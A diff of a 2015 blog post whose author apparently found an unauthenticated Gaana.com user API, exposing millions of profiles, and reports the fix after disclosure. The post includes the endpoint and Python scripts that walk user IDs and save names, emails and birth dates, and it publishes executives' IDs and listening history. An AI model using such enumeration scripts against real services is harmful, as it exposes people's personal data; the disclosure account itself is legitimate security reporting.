@@ -37,9 +37,13 @@
         </div>
         <div class="collapse navbar-collapse navbar-right">
           <ul class="nav navbar-nav">
-            <li><a href="http://avi.im/blag/about/">About</a></li>
-            <li><a href="http://avi.im/blag/contact/">Contact</a></li>
+            <li ><a href="http://avi.im/blag/archives.html">archives</a></li>
+            <li ><a href="http://avi.im/blag/tags.html">tags</a></li>           
+            <li><a href="http://avi.im/blag/about/">about</a></li>
+            <li><a href="http://avi.im/blag/projects/">projects</a></li>
+            <!--
             <li><a href="http://avi.im/blag/tags.html">tags</a></li>
+            -->
           </ul>
         </div>
         <!-- /.navbar-collapse -->
@@ -52,20 +56,31 @@
           An exploit on Gaana.com gave me access to their entire User Database
         </h2>
         
-        <div class="text-muted">Tue 12 May 2015</div>
+        <div class="text-muted">May 12, 2015</div>
       </header>
 <!-- .entry-content -->
       <div class="entry-content">
-        <p>Ever since <a href="http://blog.mclov.in/path-uploads-your-entire-iphone-address-book-to-its-servers-22HGO5EiLJKhWZPKdMOgdw">Path - iPhone Address Book fiasco</a> I have developed a habit of doing MITM and checking app's internal APIs. Yesterday I was playing around with <a href="http://gaana.com">Gaana.com</a>'s <a href="https://itunes.apple.com/in/app/gaana-unlimited-bollywood/id585270521?mt=8">app</a> and I came across an internal API which gave me access to their user database. Surprisingly, it did not require any cookies, authentication, session id or anything. Anyone with an URL would have had access to Gaana's User DB. </p>
-<p>I got access to following data of each user:
- - Full Name
- - Photo 
- - Email address 
- - Date of Birth
- - Sex
- - Last song they listened on Gaana</p>
-<p>Following image shows my personal info on Gaana.com which was accessible to anyone. Well, here's <a href="https://archive.is/HEvUv">proof</a>. If ~Archive Today~ <a href="http://archive.is">Archive Is</a> can access the data then anyone can.</p>
-<p>I also got an idea about how they are handling user account deletion. Spoiler alert, even if they have deleted your account, they still retain your profile pic. </p>
+        <p><img alt="What if I told you, that Matrix is real?" src="http://avi.im/blag/images/2015/hacking-gaana/whatif.png" /></p>
+<p><strong>EDIT(28/May/2015)</strong>: You have probably read about Gaana hack in recent news. But this exploit is different than the one found by <a href="http://www.thegeekbyte.com/4841/gaana-com-database-compromised-by-hackers/">MakMan and g00n</a>. Mak Man's hack includes SQL Injection, but the vulnerability I found could have been exploited by anyone with a browser and internet connection. No expertise required at all, that's what makes this even more ugly.</p>
+<hr />
+<p>Ever since <a href="http://blog.mclov.in/path-uploads-your-entire-iphone-address-book-to-its-servers-22HGO5EiLJKhWZPKdMOgdw">Path - iPhone Address Book fiasco</a> I have developed a habit of doing MITM and checking app's internal APIs. Yesterday I was playing around with <a href="http://gaana.com">Gaana.com</a>'s <a href="https://itunes.apple.com/in/app/gaana-unlimited-bollywood/id585270521?mt=8">app</a>, I came across this vulnerability. Gaana was started by The Times Group, the same guys behind the national daily newspaper The Times Of India. </p>
+<p>I came across an internal API which gave me access to their entire user database. Surprisingly, it did not require any cookies, authentication, session id or anything. Anyone with an URL would have had access to Gaana's User DB. </p>
+<p>I got access to following data of each user:</p>
+<ul>
+<li>Full name</li>
+<li>Profile picture </li>
+<li>Email address </li>
+<li>Date of birth</li>
+<li>Sex</li>
+<li>Last song they listened on Gaana</li>
+</ul>
+<p><img alt="all the poor users" src="http://avi.im/blag/images/2015/hacking-gaana/all-users-censored.png" width="99%" height="99%" /></p>
+<p>Following image shows my personal info on Gaana.com which was accessible to anyone:</p>
+<p><img alt="this is me" src="http://avi.im/blag/images/2015/hacking-gaana/me.png" width="99%" height="99%" /></p>
+<p>Well, here's <a href="https://archive.is/HEvUv">proof</a>. If <s>Archive Today</s> <a href="http://archive.is">Archive Is</a> can access the data then anyone can.</p>
+<p>The Times Internet CEO Satyan Gajwani's user id on Gaana user database is <code>72</code> and the last song he listened on Gaana was <em>Happy Birthday</em> from album <em>Party Time Songs And Nursery Rhymes</em>. The current Gaana's business head, Pawan Agarwal's user id is <code>831</code> and the last song he listened on Gaana was <em>Hangover</em> from movie <em>Kick</em>. Avinash Mudaliar, the co-founder and former head of Gaana's user id is <code>57</code>. And The last song he listened on Gaana was <em>Khuda Bhi</em> from movie <em>Ek Paheli Leela</em>.</p>
+<p>I think I had access to the all the users of Gaana. <strong>Before I got bored, the last record I checked was 11,872,026 (11 Million something) user</strong>. However not all of data was filled, some profiles were deleted and some had null values.</p>
+<p>I also got an idea about how they are handling user account deletion. Spoiler alert, even if they have deleted your account, they still retain your profile picture. However I have no idea how do I delete my account. I couldn't find any such option in the app.</p>
 <h2>The Hack</h2>
 <p>During normal session, I came across an API which was retrieving user data from Gaana's database:</p>
 <div class="highlight"><pre>api.gaana.com/user.php?type=get_user_object&amp;&amp;user_id=&lt;user_id&gt;&amp;token=&lt;token&gt;
@@ -78,14 +93,26 @@
 </pre></div>
 
 
-<p>My first doubt was, why there is even a <code>user_id</code> field. I am not an expert developer, but if I were designing I wouldn't include <code>user-id</code> in the API call. The <code>token</code> should be just enough. And I would regenerate it for every session or make it expire after few hours or something like that. And ofcourse, make this communication over TLS/SSL. </p>
+<p>My first doubt was, why there is even a <code>user_id</code> field. I am not an expert developer, but if I were designing I wouldn't include <code>user_id</code> in the API call. The <code>token</code> should be just enough. And I would regenerate it for every session or make it expire after few hours or something like that. Or I would use OAuth2. And of course, make this communication over TLS/SSL. </p>
 <p>I copied the above URL and opened it in Browser and it showed my info. Without HTTPS. I have never used or logged into Gaana.com in my browser. So I assumed it's not doing any other validation and using only <code>token</code>. Though not using HTTPS was worrisome. </p>
-<p>Then I incremented my <code>user_id</code> by 1 and sent GET again:</p>
-<p>Then I kept on changing <code>user_id</code> and started sending GETs. It always worked. Then I thought, would it work if I change the token? </p>
-<p>Well yeah, it did work. Then another try:</p>
-<p>Hmm...There's something really fishy going on. What if I don't provide any <code>token</code> at all? </p>
-<p>WUT! </p>
-<p>All you had to was loop through <code>user_id</code> starting from 1. Following simple script </p>
+<p>Then I incremented my <code>user_id</code> by 1 and sent GET again. Return response status was 200. </p>
+<p>I wanted to be really sure. So I created a throwaway profile on Gaana. And yes, <a href="https://archive.is/bkuNY">I was able to access it with same token</a>.</p>
+<p>Then I kept on changing <code>user_id</code> and started sending GETs. It always worked. </p>
+<p>User 1:</p>
+<p><img alt="user1" src="http://avi.im/blag/images/2015/hacking-gaana/user1.png" width="99%" height="99%" /></p>
+<p>User 9,99,999:</p>
+<p><img alt="user999999" src="http://avi.im/blag/images/2015/hacking-gaana/user999999.png" width="99%" height="99%" /></p>
+<p>User 11872026(11 Million something):</p>
+<p><img alt="user11872026" src="http://avi.im/blag/images/2015/hacking-gaana/user11872026.png" width="99%" height="99%" /></p>
+<p>Several hours had already passed, but still my token was active. I logged out of Gaana app, cleared app data, but it was still working. Then I thought, would it work if I change the token? <a href="https://archive.is/lTAIx">Entered</a> some gibberish of same length:</p>
+<p><img alt="somerandomtoken" src="http://avi.im/blag/images/2015/hacking-gaana/somerandomtoken.png" width="99%" height="99%" /></p>
+<p>Well yeah, it did work. Then another <a href="https://archive.is/wsGC6">try</a>, you know, just to be sure:</p>
+<p><img alt="somerandomtoken2" src="http://avi.im/blag/images/2015/hacking-gaana/somerandomtoken2.png" width="99%" height="99%" /></p>
+<p>Hmm...There's something <a href="https://archive.is/BngCd">really fishy</a> was going on. What if I don't provide any <code>token</code> at all? </p>
+<p><img alt="wut" src="http://avi.im/blag/images/2015/hacking-gaana/wut.png" width="99%" height="99%" /></p>
+<p><strong>WUT!</strong></p>
+<p>So token wasn't required at all. </p>
+<p>All you had to was loop through <code>user_id</code> starting from 1. Following simple four line Python script was enough to fetch all the details of Gaana users.</p>
 <div class="highlight"><pre><span class="kn">import</span> <span class="nn">requests</span>
 <span class="n">api</span> <span class="o">=</span> <span class="s">&#39;http://api.gaana.com/user.php?type=get_user_object&amp;&amp;user_id={0}&#39;</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SOME_NUM</span><span class="p">):</span>
@@ -93,7 +120,15 @@
 </pre></div>
 
 
-<p>Here's the much elaborate script I used: </p>
+<p>It took me ~50 minutes (used <a href="https://docs.python.org/3/library/time.html#time.time"><code>time.time()</code></a>) to fetch 10,000 user records:</p>
+<p><img alt="frequency" src="http://avi.im/blag/images/2015/hacking-gaana/frequency.png" /></p>
+<h3>Bonus:</h3>
+<p>Following image shows how user deletion is being done on Gaana. Note that the profile picture was valid, so I guess they retain your profile picture even if you delete your account from Gaana. However I have no idea how to delete my account on Gaana. Most probably, I have to contact them to have my account deleted. (which I should do very very soon.) </p>
+<p><img alt="a deleted user" src="http://avi.im/blag/images/2015/hacking-gaana/deleteduser.png" width="99%" height="99%" /></p>
+<p>A random row with null data:</p>
+<p><img alt="a null user" src="http://avi.im/blag/images/2015/hacking-gaana/nulluser.png" width="99%" height="99%" /></p>
+<h2>The Script</h2>
+<p>Here's the much elaborate script which I had used. However it does not work, but posted it here for educational purposes. If you have some suggestions, improvements, please leave in comments or send me a <a href="http://github.com/avinassh/hacking-gaana">PR</a>: </p>
 <div class="highlight"><pre><span class="kn">import</span> <span class="nn">sqlite3</span>
 <span class="kn">import</span> <span class="nn">datetime</span>
 <span class="kn">import</span> <span class="nn">time</span>
@@ -123,7 +158,7 @@
 
 <span class="k">def</span> <span class="nf">initialize_db</span><span class="p">():</span>
     <span class="n">db</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
-    <span class="c"># db.create_tables([GaanaUser])</span>
+    <span class="n">db</span><span class="o">.</span><span class="n">create_tables</span><span class="p">([</span><span class="n">GaanaUser</span><span class="p">])</span>
 
 
 <span class="k">def</span> <span class="nf">deinit</span><span class="p">():</span>
@@ -133,7 +168,7 @@
 <span class="k">def</span> <span class="nf">get_gaana_user_data</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
     <span class="sd">&quot;&quot;&quot; Returns Gaana user data only if he has all the fields required &quot;&quot;&quot;</span>
     <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">users_data_public_api</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_id</span><span class="p">))</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">&quot;got {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_id</span><span class="p">))</span>
+    <span class="c"># print(&quot;got {}&quot;.format(user_id))</span>
     <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">requests</span><span class="o">.</span><span class="n">codes</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
         <span class="n">user_data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s">&#39;users&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
         <span class="k">if</span> <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;email&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="ow">and</span> <span class="s">&#39;deleted@gaana.com&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;email&#39;</span><span class="p">]:</span>
@@ -147,10 +182,10 @@
 
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11900</span><span class="p">,</span> <span class="mi">12300</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">):</span>
         <span class="n">user_data</span> <span class="o">=</span> <span class="n">get_gaana_user_data</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">user_data</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">&quot;putting {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+            <span class="c"># print(&quot;putting {}&quot;.format(i))</span>
             <span class="n">poor_user</span> <span class="o">=</span> <span class="n">GaanaUser</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;user_id&#39;</span><span class="p">],</span>
                                   <span class="n">fullname</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;fullname&#39;</span><span class="p">],</span>
                                   <span class="n">email</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;email&#39;</span><span class="p">],</span>
@@ -168,10 +203,49 @@
 </pre></div>
 
 
-<p>Lets see JS works in MD.</p>
-<script data-isso="//localhost:1234/" src="localhost:1234/js/embed.min.js"></script>
-
-<section id="isso-thread"></section>
+<h2>Aftermath</h2>
+<p>Here is the entire chain of events:</p>
+<ol>
+<li>
+<p>I found the exploit on 12/May/2015, ~3.30 PM. By 4.30 PM, I was convinced that Gaana had a vulnerability. I Googled for their security team email, searched if they have Bug Bounty Programmes. But neither I found any email or Bug Bounty programmes on Gaana. Gaana did not have any 'Contact Us' in their website footer. </p>
+</li>
+<li>
+<p>I tweeted them on Twitter and waited for response:</p>
+<p><blockquote class="twitter-tweet" lang="en"><p lang="en" dir="ltr"><a href="https://twitter.com/gaana">@gaana</a> lets say hypothetically some1 hacked ur server &amp; got access. Hw should they go abut contacting ur security team? security@gaana.com?</p>&mdash; avi (@iavins) <a href="https://twitter.com/iavins/status/598088551394189312">May 12, 2015</a></blockquote><script async src="http://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
+<p>They were active on Twitter, replying to others. But did not reply to me. May be they thought I was pulling some prank. Also, I did find a contact form on their website after bit of searching(to which they responded after three days).</p>
+</li>
+<li>
+<p>I tweeted again in night:</p>
+<p><blockquote class="twitter-tweet" lang="en"><p lang="en" dir="ltr"><a href="https://twitter.com/gaana">@gaana</a> guys, can you tell me how do I get in touch with your security/bugs team?</p>&mdash; avi (@iavins) <a href="https://twitter.com/iavins/status/598166155736457216">May 12, 2015</a></blockquote><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>
+<p>And they finally replied to me next day and asked me to DM, which <a href="http://avi.im/blag/images/2015/hacking-gaana/dm.png">I did</a>.</p>
+</li>
+<li>
+<p>Finally their dev emailed on May 13th evening and I sent him all the details, including SQL dump (so that he takes me seriously):</p>
+<p><img alt="first email" src="http://avi.im/blag/images/2015/hacking-gaana/firstemail.png" width="99%" height="99%" /></p>
+</li>
+<li>
+<p>On May 17th (i.e. 5 days after the exploit), I emailed them again asking why it wasn't fixed yet. Their site was up and running, but exploit wasn't fixed. I was worried if someone else figures this out and makes the data public.</p>
+<p>Their developer called me again and assured me that it will be fixed soon and it's taking time because of API backward compatibility issues.</p>
+</li>
+<li>
+<p>Sometime on May 23-24rd (i.e. ~10 days after exploit) the vulnerability was partially fixed. Now you were able to get full name and profile pic. However API was still openly accessible, over HTTP, in the browser:</p>
+<p><img alt="partial fix" src="http://avi.im/blag/images/2015/hacking-gaana/partialfix.png" width="99%" height="99%" /></p>
+</li>
+<li>
+<p>On 28th May, <a href="http://www.thegeekbyte.com/4841/gaana-com-database-compromised-by-hackers/">MakMan and g00n</a> found another exploit using SQL injection. And Gaana was down for maintenance for most of the day. In evening, I received a call from Gaana's business head and was assured that it will be fixed asap. I was hoping they will fix it, as it's been already two weeks. </p>
+</li>
+<li>
+<p>But I was wrong. It wasn't <a href="https://archive.is/uuifC">fixed</a>. It made me angry and furious because they took SQL injection pretty seriously because it was all over news and hurting their PR. I was thinking, how they would have reacted to this issue, if I had made this whole thing public from beginning. I <a href="https://twitter.com/iavins/status/604150195442475009">tweeted</a> to Gaana CEO for his email ID, I never received any reply. But then...I found his email from the very database I had hacked and sent another email.</p>
+</li>
+<li>
+<p>On May 30 2015, evening <a href="https://archive.is/7EaEx">Gaana</a> <a href="http://avi.im/blag/images/2015/hacking-gaana/gaanadown.png">was down</a> again, so was the <a href="https://archive.is/ksPRd">API end point</a>. Are they finally fixing the exploit I found? </p>
+<p><img alt="api end was down" src="http://avi.im/blag/images/2015/hacking-gaana/apidown.png" /></p>
+</li>
+<li>
+<p>On May 30, 2015, around ~10pm, I checked again. The exploit was finally <a href="https://archive.is/fWEDq">fixed</a>:</p>
+<p><img alt="partial fix" src="http://avi.im/blag/images/2015/hacking-gaana/apifixed.png" width="99%" height="99%" /></p>
+</li>
+</ol>
       </div>
 <!-- /.entry-content -->
       <footer class="post-info text-muted">
@@ -186,11 +260,17 @@
         </button>
       </footer>
       <!-- /.post-info -->
+    <!-- Comment BEGIN -->
+    <div id="isso_thread_div"></div>
+    <script data-isso="//isso-avinassh.rhcloud.com/" src="//posativ.org/isso/api/js/embed.min.js"></script>
+    <section id="isso-thread"></section>    
+    <noscript>Please enable JavaScript to view the <a href="http://posativ.org/isso/">comments powered by Isso.</a></noscript>
+    <!-- Comment END -->
     </section>
     </div>
     <footer class="footer">
       <div class="container">
-        <p class="footer-text">&copy; <a href="http://avi.im/blag">blag</a> powered by <a href="http://getpelican.com/">pelican</a> and Skyfall</p>
+        <p class="footer-text">&copy; <a href="http://avi.im/blag">blag</a> powered by <a href="http://getpelican.com/">pelican</a> with <a href="https://github.com/avinassh/skyfall">skyfall</a> theme.</p>
       </div>
     </footer>
     <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
